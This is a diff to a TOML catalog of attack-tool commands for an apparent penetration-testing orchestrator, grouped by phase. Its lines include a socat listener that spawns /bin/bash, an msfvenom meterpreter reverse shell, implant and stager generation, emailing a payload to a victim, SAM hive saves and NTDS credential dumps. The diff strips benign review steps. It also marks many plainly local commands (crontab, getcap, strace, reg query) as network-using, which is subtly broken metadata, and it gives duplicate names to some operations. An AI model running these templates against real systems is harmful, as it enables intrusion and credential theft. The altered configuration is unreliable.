@@ -148,20 +148,6 @@ args = ['-d', '{domain}', '-b', 'crtsh', '-l', '{limit}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "whois"
-[[capability.provider.operation]]
-name = "Registrant Contact Review"
-args = ["{domain}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "Mail Hosts"
-args = ["+short", "{domain}", "MX"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.whois-intelligence'
 phase = 'recon'
@@ -185,24 +171,6 @@ args = ['intel', '-whois', '-d', '{domain}']
 output = 'lines'
 network = true
 
-[[capability.provider.operation]]
-name = "Passive Intel"
-args = ["enum", "-passive", "-d", "{domain}"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "Authoritative NS"
-args = ["+short", "{domain}", "NS"]
-output = "lines"
-network = true
-
-[[capability.provider.operation]]
-name = "Mail Routing"
-args = ["+short", "{domain}", "MX"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.certificate-intel'
 phase = 'recon'
@@ -237,13 +205,13 @@ binary = 'openssl'
 name = 'Certificate Text'
 args = ['s_client', '-connect', '{domain}:{port}', '-servername', '{domain}']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Validity Dates'
 args = ['s_client', '-connect', '{domain}:{port}', '-showcerts']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'ctfr'
 [[capability.provider.operation]]
@@ -275,26 +243,6 @@ args = ['intel', '-d', '{domain}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "whois"
-[[capability.provider.operation]]
-name = "ASN Record"
-args = ["{domain}"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "Address Records"
-args = ["+short", "{domain}", "A"]
-output = "lines"
-network = true
-
-[[capability.provider.operation]]
-name = "Authority Records"
-args = ["+short", "{domain}", "NS"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.cloud-exposure'
 phase = 'recon'
@@ -326,18 +274,6 @@ args = ['s3', 'ls', 's3://{keyword}', '--no-sign-request']
 output = 'lines'
 network = true
 
-[[capability.provider.operation]]
-name = "Public Bucket Check"
-args = ["s3api", "list-buckets", "--no-sign-request"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Cloud Metadata Header Check"
-args = ["-sS", "-I", "https://{domain}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.username-discovery'
 phase = 'recon'
@@ -368,19 +304,6 @@ args = ['--username', '{username}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Profile Reachability"
-args = ["-sS", "-I", "https://github.com/{username}"]
-output = "lines"
-network = true
-
-[[capability.provider.operation]]
-name = "Profile Headers"
-args = ["-sS", "-I", "https://github.com/{username}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.tech-fingerprint'
 phase = 'recon'
@@ -411,19 +334,6 @@ args = ['{url}', '-v']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "HTTP Headers"
-args = ["-sS", "-I", "{url}"]
-output = "lines"
-network = true
-
-[[capability.provider.operation]]
-name = "Response Metadata"
-args = ["-sS", "-I", "{url}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.web-crawling'
 phase = 'recon'
@@ -503,13 +413,6 @@ args = ['-i', '{domain}', '-mode', 'U']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Archive Index"
-args = ["-sS", "https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&filter=statuscode:200"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.metadata-extraction'
 phase = 'recon'
@@ -636,20 +539,6 @@ args = ['-w', '{domain}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Public Header Review"
-args = ["-sS", "-I", "https://{domain}"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "Public DNS Context"
-args = ["+short", "{domain}", "A"]
-output = "lines"
-network = true
 [[capability]]
 id = 'recon.infra-profiling'
 phase = 'recon'
@@ -726,26 +615,6 @@ network = true
 # ATTACK SURFACE
 # --------------------------------------------------------------------------
 
-[[capability.provider]]
-binary = "git"
-[[capability.provider.operation]]
-name = "Repository Status"
-args = ["-C", "{path}", "status", "--short"]
-output = "lines"
-network = false
-
-[[capability.provider.operation]]
-name = "Tracked Files"
-args = ["-C", "{path}", "ls-files"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "find"
-[[capability.provider.operation]]
-name = "Repository Artifacts"
-args = ["{path}", "-type", "f", "-name", ".gitignore"]
-output = "lines"
-network = false
 [[capability]]
 id = 'surface.port-discovery'
 phase = 'surface'
@@ -855,20 +724,6 @@ args = ['tls', '-f', '{target}', '-p', '443']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "ss"
-[[capability.provider.operation]]
-name = "Local Listeners"
-args = ["-lntup"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "HTTP Service Headers"
-args = ["-sS", "-I", "http://{target}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'surface.host-discovery'
 phase = 'surface'
@@ -972,19 +827,6 @@ args = ['scan', 'single', '-u', '{target}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "HTTP Header Review"
-args = ["-sS", "-I", "http://{target}"]
-output = "lines"
-network = true
-
-[[capability.provider.operation]]
-name = "TLS Header Review"
-args = ["-sS", "-I", "https://{target}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'surface.api-discovery'
 phase = 'surface'
@@ -1073,20 +915,6 @@ args = ['--script', 'hostmap-crtsh', '-p', '443', '{target}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Base Host Check"
-args = ["-sS", "-I", "https://{domain}"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "Vhost DNS Context"
-args = ["+short", "{domain}", "A"]
-output = "lines"
-network = true
 [[capability]]
 id = 'surface.content-discovery'
 phase = 'surface'
@@ -1377,20 +1205,6 @@ args = ['-u', '{target}', '-tags', 'database,db', '-silent', '-nc']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "ss"
-[[capability.provider.operation]]
-name = "Local DB Listeners"
-args = ["-lntup"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Service Banner Check"
-args = ["-sS", "-I", "http://{target}:8080"]
-output = "lines"
-network = true
 [[capability]]
 id = 'surface.network-profiling'
 phase = 'surface'
@@ -1477,19 +1291,6 @@ args = ['{target}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "A Record Correlation"
-args = ["+short", "{target}", "A"]
-output = "lines"
-network = true
-
-[[capability.provider.operation]]
-name = "CNAME Correlation"
-args = ["+short", "{target}", "CNAME"]
-output = "lines"
-network = true
 [[capability]]
 id = 'surface.directory-bruteforce'
 phase = 'surface'
@@ -1661,20 +1462,6 @@ args = ['-u', '{target}', '-as', '-silent', '-nc']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "httpx"
-[[capability.provider.operation]]
-name = "Live Target Validation"
-args = ["-u", "{target}", "-silent"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "nmap"
-[[capability.provider.operation]]
-name = "Service Validation"
-args = ["-sV", "{target}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'vulnerability.web-assessment'
 phase = 'vulnerability'
@@ -2044,20 +1831,6 @@ args = ['scan', '--input-file', 'account-auth-details.json']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "aws"
-[[capability.provider.operation]]
-name = "Caller Identity"
-args = ["sts", "get-caller-identity"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "gcloud"
-[[capability.provider.operation]]
-name = "Project Inventory"
-args = ["projects", "list", "--format=value(projectId)"]
-output = "lines"
-network = true
 [[capability]]
 id = 'vulnerability.tls-assessment'
 phase = 'vulnerability'
@@ -2313,20 +2086,6 @@ args = ['run', '--target', '{domain}', '--hide_fails']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "CNAME Validation"
-args = ["+short", "{domain}", "CNAME"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "HTTP Ownership Check"
-args = ["-sS", "-I", "https://{domain}"]
-output = "lines"
-network = true
 [[capability]]
 id = 'vulnerability.finding-validation'
 phase = 'vulnerability'
@@ -2368,20 +2127,6 @@ network = true
 # PAYLOAD
 # --------------------------------------------------------------------------
 
-[[capability.provider]]
-binary = "curl"
-[[capability.provider.operation]]
-name = "Response Headers"
-args = ["-sS", "-I", "{url}"]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "openssl"
-[[capability.provider.operation]]
-name = "TLS Certificate Check"
-args = ["s_client", "-connect", "{url}:443", "-servername", "{url}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.shellcode-generation'
 phase = 'payload'
@@ -2436,20 +2181,6 @@ args = ['-i', '{lhost}', '-o', 'loader.bin', '-a', '2', '-f', '1']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Artifact Type Review"
-args = ["{lhost}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "strings"
-[[capability.provider.operation]]
-name = "Artifact String Review"
-args = ["{lhost}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.payload-encoding'
 phase = 'payload'
@@ -2531,20 +2262,6 @@ args = ['-I', '{template}', '-Loader', 'binary', '-domain', '{lhost}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Binary Type Review"
-args = ["{template}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Template Integrity Hash"
-args = ["{template}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.macro-crafting'
 phase = 'payload'
@@ -2630,20 +2347,6 @@ args = ['--teamserver', '{c2host}:{c2port}', 'generate', 'demon', '--os', 'windo
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Artifact Type Review"
-args = ["/tmp/implant"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "strings"
-[[capability.provider.operation]]
-name = "Artifact Marker Review"
-args = ["/tmp/implant"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.stager-creation'
 phase = 'payload'
@@ -2692,20 +2395,6 @@ args = ['-i', 'implant.exe', '-o', 'stager.bin', '-a', '2', '-f', '1', '-e', '3'
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Stager Artifact Review"
-args = ["/tmp/stager"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Stager Integrity Hash"
-args = ["/tmp/stager"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.dropper-packaging'
 phase = 'payload'
@@ -2787,20 +2476,6 @@ args = ['{payload}', '-o', 'obfuscated.sh']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Obfuscated Type Review"
-args = ["{payload}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Obfuscated Artifact Hash"
-args = ["{payload}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.binary-analysis'
 phase = 'payload'
@@ -2861,7 +2536,7 @@ binary = 'strace'
 name = 'Syscall Trace'
 args = ['-f', '-o', 'trace.txt', '{binary}']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'payload.c2-configuration'
@@ -2960,22 +2635,8 @@ binary = 'defendercheck'
 name = 'Defender Check'
 args = ['{binary}']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Binary Type Check"
-args = ["{binary}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Binary Integrity Hash"
-args = ["{binary}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.staging-server'
 phase = 'payload'
@@ -3014,20 +2675,6 @@ args = ['http://{path}:{port}', '-O', '-', '-q']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "ss"
-[[capability.provider.operation]]
-name = "Listener Review"
-args = ["-lntp"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Staged Artifact Review"
-args = ["{path}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.delivery-preparation'
 phase = 'payload'
@@ -3067,20 +2714,6 @@ args = ['-s', 'Report', '{payload}', 'victim@{rhost}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Delivery Artifact Review"
-args = ["{payload}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Delivery Artifact Hash"
-args = ["{payload}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'payload.payload-validation'
 phase = 'payload'
@@ -3116,13 +2749,13 @@ binary = 'strace'
 name = 'Network Trace'
 args = ['-f', '-e', 'trace=network', '{binary}']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'File Trace'
 args = ['-f', '-e', 'trace=file', '{binary}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'md5sum'
 [[capability.provider.operation]]
@@ -3259,7 +2892,7 @@ output = 'lines'
 network = true
 
 [[capability.provider.operation]]
-name = "Ncat TLS Listener"
+name = 'TLS Listener'
 args = ['-lvnp', '{port}', '--ssl', '--ssl-cert', '{cert}', '--ssl-key', '{key}']
 output = 'lines'
 network = true
@@ -3272,7 +2905,7 @@ output = 'lines'
 network = true
 
 [[capability.provider.operation]]
-name = "Socat TLS Listener"
+name = 'TLS Listener'
 args = ['OPENSSL-LISTEN:{port},cert={cert},reuseaddr,fork', 'EXEC:/bin/bash']
 output = 'lines'
 network = true
@@ -3327,22 +2960,8 @@ binary = 'linpeas'
 name = 'Auto Enum'
 args = ['-a']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "getcap"
-[[capability.provider.operation]]
-name = "Capability Review"
-args = ["-r", "{path}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "stat"
-[[capability.provider.operation]]
-name = "Permission Review"
-args = ["-c", "%A %U %G %n", "{path}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.kernel-probing'
 phase = 'escalation'
@@ -3364,7 +2983,7 @@ binary = 'linux-exploit-suggester'
 name = 'Exploit Suggest'
 args = ['--kernel', '{kernel}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'searchsploit'
 [[capability.provider.operation]]
@@ -3378,22 +2997,8 @@ binary = 'les2'
 name = 'Suggester Two'
 args = ['-k', '{kernel}']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "dmesg"
-[[capability.provider.operation]]
-name = "Kernel Message Review"
-args = ["--level=err,warn"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sysctl"
-[[capability.provider.operation]]
-name = "Kernel Security Settings"
-args = ["-a"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.credential-hunting'
 phase = 'escalation'
@@ -3447,14 +3052,14 @@ binary = 'systemctl'
 name = 'Running Services'
 args = ['list-units', '--type=service', '--state=running']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'ss'
 [[capability.provider.operation]]
 name = 'Listening Ports'
 args = ['-tlnp']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'nmap'
 [[capability.provider.operation]]
@@ -3487,42 +3092,22 @@ binary = 'sudo'
 name = 'List Rights'
 args = ['-l']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'linpeas'
 [[capability.provider.operation]]
 name = 'Sudo Check'
 args = ['-s']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'pspy'
 [[capability.provider.operation]]
 name = 'Process Watch'
 args = ['-pf', '-i', '1000']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "visudo"
-[[capability.provider.operation]]
-name = "Sudoers Syntax Check"
-args = ["-c"]
-output = "lines"
-network = false
-
-[[capability.provider.operation]]
-name = "Sudoers File Check"
-args = ["-cf", "/etc/sudoers"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "grep"
-[[capability.provider.operation]]
-name = "Sudoers Policy Search"
-args = ["-R", "-n", "^[[:space:]]*[^#]", "/etc/sudoers.d"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.capability-audit'
 phase = 'escalation'
@@ -3534,35 +3119,22 @@ binary = 'getcap'
 name = 'Recursive Caps'
 args = ['-r', '/']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'capsh'
 [[capability.provider.operation]]
 name = 'Process Caps'
 args = ['--print']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'linpeas'
 [[capability.provider.operation]]
 name = 'Caps Check'
 args = ['-a']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Capability File Review"
-args = ["/usr/bin"]
-output = "lines"
-network = false
-
-[[capability.provider.operation]]
-name = "Binary Type Review"
-args = ["/usr/bin"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.cron-audit'
 phase = 'escalation'
@@ -3574,7 +3146,7 @@ binary = 'crontab'
 name = 'User Cron'
 args = ['-l']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
@@ -3594,22 +3166,8 @@ binary = 'pspy'
 name = 'Cron Watch'
 args = ['-pf', '-i', '1000']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "systemctl"
-[[capability.provider.operation]]
-name = "Timer Inventory"
-args = ["list-timers", "--all", "--no-pager"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "stat"
-[[capability.provider.operation]]
-name = "Cron Permission Review"
-args = ["-c", "%A %U %G %n", "/etc/crontab"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.path-hijack'
 phase = 'escalation'
@@ -3642,22 +3200,8 @@ binary = 'strace'
 name = 'Execve Trace'
 args = ['-f', '-e', 'trace=execve', '/usr/bin/suid-binary']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "command"
-[[capability.provider.operation]]
-name = "Command Resolution"
-args = ["-v", "sh"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "env"
-[[capability.provider.operation]]
-name = "Environment Review"
-args = []
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.token-abuse'
 phase = 'escalation'
@@ -3670,38 +3214,21 @@ name = 'Privilege Dump'
 args = ['/priv']
 output = 'lines'
 network = false
-[[capability.provider.operation]]
-name = "Group Membership"
-args = ["/groups"]
-output = "lines"
-network = false
-[[capability.provider.operation]]
-name = "Account Context"
-args = []
-output = "lines"
-network = false
 [[capability.provider]]
 binary = 'winpeas'
 [[capability.provider.operation]]
 name = 'Token Enum'
 args = ['quiet', 'tokeninfo']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'seatbelt'
 [[capability.provider.operation]]
 name = 'Token Audit'
 args = ['TokenPrivileges', 'TokenGroups']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "cmd"
-[[capability.provider.operation]]
-name = "Environment Review"
-args = ["/c", "set"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.registry-audit'
 phase = 'escalation'
@@ -3713,33 +3240,33 @@ binary = 'reg'
 name = 'Always Install'
 args = ['query', 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer', '/v', 'AlwaysInstallElevated']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Run Keys'
 args = ['query', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Winlogon'
 args = ['query', 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', '/v', 'DefaultPassword']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'winpeas'
 [[capability.provider.operation]]
 name = 'Registry Enum'
 args = ['quiet', 'applicationsinfo']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'accesschk'
 [[capability.provider.operation]]
 name = 'Key Permissions'
 args = ['-kvuqsw', 'HKLM\SYSTEM\CurrentControlSet\Services']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'escalation.dll-hijack'
@@ -3752,14 +3279,14 @@ binary = 'winpeas'
 name = 'DLL Enum'
 args = ['quiet', 'applicationsinfo']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'accesschk'
 [[capability.provider.operation]]
 name = 'Write Check'
 args = ['-wvud', 'C:\Program Files\']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'msfvenom'
 [[capability.provider.operation]]
@@ -3768,20 +3295,6 @@ args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST=10.10.10.1', 'LPORT=
 output = 'lines'
 network = false
 
-[[capability.provider]]
-binary = "where"
-[[capability.provider.operation]]
-name = "Binary Resolution"
-args = ["cmd.exe"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "powershell"
-[[capability.provider.operation]]
-name = "Module Path Review"
-args = ["-NoProfile", "-Command", "$env:Path"]
-output = "lines"
-network = false
 [[capability]]
 id = 'escalation.container-escape'
 phase = 'escalation'
@@ -3812,7 +3325,7 @@ binary = 'capsh'
 name = 'Container Caps'
 args = ['--print']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'nsenter'
 [[capability.provider.operation]]
@@ -3826,7 +3339,7 @@ binary = 'linpeas'
 name = 'Container Check'
 args = ['-a']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'escalation.cloud-escalation'
@@ -3998,7 +3511,7 @@ binary = 'ss'
 name = 'Elevated Ports'
 args = ['-tlnp']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'uname'
 [[capability.provider.operation]]
@@ -4046,20 +3559,6 @@ args = ['all']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Dump Type Review"
-args = ["{dump}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Dump Integrity Hash"
-args = ["{dump}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'credentials.hash-extraction'
 phase = 'credentials'
@@ -4074,7 +3573,7 @@ inputs = [
 [[capability.provider]]
 binary = 'impacket-secretsdump'
 [[capability.provider.operation]]
-name = "Impacket NTDS Dump"
+name = 'NTDS Dump'
 args = ['{domain}@{target}', '-just-dc-ntlm']
 output = 'lines'
 network = true
@@ -4099,25 +3598,11 @@ output = 'lines'
 network = true
 
 [[capability.provider.operation]]
-name = "NetExec NTDS Dump"
+name = 'NTDS Dump'
 args = ['smb', '{target}', '-u', '{username}', '-p', '{password}', '--ntds', 'drsuapi']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Artifact Type Review"
-args = ["/tmp/credential-artifact"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Artifact Integrity Hash"
-args = ["/tmp/credential-artifact"]
-output = "lines"
-network = false
 [[capability]]
 id = 'credentials.password-cracking'
 phase = 'credentials'
@@ -4420,26 +3905,14 @@ binary = 'openssl'
 name = 'PFX Key Extract'
 args = ['pkcs12', '-in', 'administrator.pfx', '-nocerts', '-out', 'admin_key.pem', '-nodes']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Certificate Inspect'
 args = ['x509', '-in', 'admin_cert.pem', '-text', '-noout']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider.operation]]
-name = "Certificate Metadata"
-args = ["x509", "-in", "/tmp/certificate.pem", "-noout", "-subject", "-issuer", "-dates"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "certutil"
-[[capability.provider.operation]]
-name = "Certificate Store Inventory"
-args = ["-store", "My"]
-output = "lines"
-network = false
 [[capability]]
 id = 'credentials.password-spraying'
 phase = 'credentials'
@@ -4577,26 +4050,6 @@ args = ['get-objectacl', '-w', '{domain}', '-u', '{username}', '-p', '{password}
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "whoami"
-[[capability.provider.operation]]
-name = "Domain Context"
-args = []
-output = "lines"
-network = false
-
-[[capability.provider.operation]]
-name = "Privilege Context"
-args = ["/all"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "wevtutil"
-[[capability.provider.operation]]
-name = "Directory Service Events"
-args = ["qe", "Security", "/q:*[System[(EventID=4662)]]", "/f:text", "/c:20"]
-output = "lines"
-network = false
 [[capability]]
 id = 'credentials.dpapi-extraction'
 phase = 'credentials'
@@ -4632,20 +4085,6 @@ args = ['credential', '-masterkey', 'KEY', '-file', '{blob}']
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Artifact Type Review"
-args = ["/tmp/dpapi-artifact"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Artifact Integrity Hash"
-args = ["/tmp/dpapi-artifact"]
-output = "lines"
-network = false
 [[capability]]
 id = 'credentials.policy-enum'
 phase = 'credentials'
@@ -4705,43 +4144,29 @@ binary = 'bkhive'
 name = 'Bootkey Extract'
 args = ['{hive}', 'bootkey.txt']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'samdump2'
 [[capability.provider.operation]]
 name = 'SAM Dump'
 args = ['{hive}', 'bootkey.txt']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'hivexget'
 [[capability.provider.operation]]
 name = 'Hive Query'
 args = ['{hive}', 'Select', 'Current']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'reg'
 [[capability.provider.operation]]
 name = 'Hive Save'
 args = ['save', 'HKLM\SAM', 'C:\temp\sam.save']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Artifact Type Review"
-args = ["/tmp/credential-artifact"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Artifact Integrity Hash"
-args = ["/tmp/credential-artifact"]
-output = "lines"
-network = false
 [[capability]]
 id = 'credentials.graph-mapping'
 phase = 'credentials'
@@ -4780,20 +4205,6 @@ args = ['-u', '{domain}\{username}', '-p', '{password}', '--dns-tcp', '{target}'
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "ldapsearch"
-[[capability.provider.operation]]
-name = "Directory Root Review"
-args = ["-x", "-H", "ldap://{domain}", "-s", "base", "-b", ""]
-output = "lines"
-network = true
-[[capability.provider]]
-binary = "dig"
-[[capability.provider.operation]]
-name = "Domain DNS Context"
-args = ["+short", "{domain}", "A"]
-output = "lines"
-network = true
 [[capability]]
 id = 'credentials.posture-report'
 phase = 'credentials'
@@ -4805,14 +4216,14 @@ inputs = [
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
-name = "Hashcat Cracked Summary"
+name = 'Cracked Summary'
 args = ['-m', '1000', '{hash}', '--show']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
-name = "John Cracked Summary"
+name = 'Cracked Summary'
 args = ['--show', '--format=NT', '{hash}']
 output = 'lines'
 network = false
@@ -4835,20 +4246,6 @@ network = false
 # LATERAL MOVEMENT
 # --------------------------------------------------------------------------
 
-[[capability.provider]]
-binary = "file"
-[[capability.provider.operation]]
-name = "Report Artifact Type"
-args = ["/tmp/report"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Report Integrity Hash"
-args = ["/tmp/report"]
-output = "lines"
-network = false
 [[capability]]
 id = 'lateral.service-discovery'
 phase = 'lateral'
@@ -4986,11 +4383,6 @@ name = 'Domain Trusts'
 args = ['/domain_trusts']
 output = 'lines'
 network = true
-[[capability.provider.operation]]
-name = "Domain Controllers"
-args = ["/dclist:"]
-output = "lines"
-network = true
 [[capability.provider]]
 binary = 'nxc'
 [[capability.provider.operation]]
@@ -5013,13 +4405,6 @@ args = ['get-netdomaintrust', '-w', '{domain}', '-u', '{username}', '-p', '{pass
 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "whoami"
-[[capability.provider.operation]]
-name = "Domain Context"
-args = []
-output = "lines"
-network = false
 [[capability]]
 id = 'lateral.directory-graph'
 phase = 'lateral'
@@ -5105,20 +4490,6 @@ args = ['-u', '{username}', '-p', '{password}', '-d', '{domain}', '-c', 'LoggedO
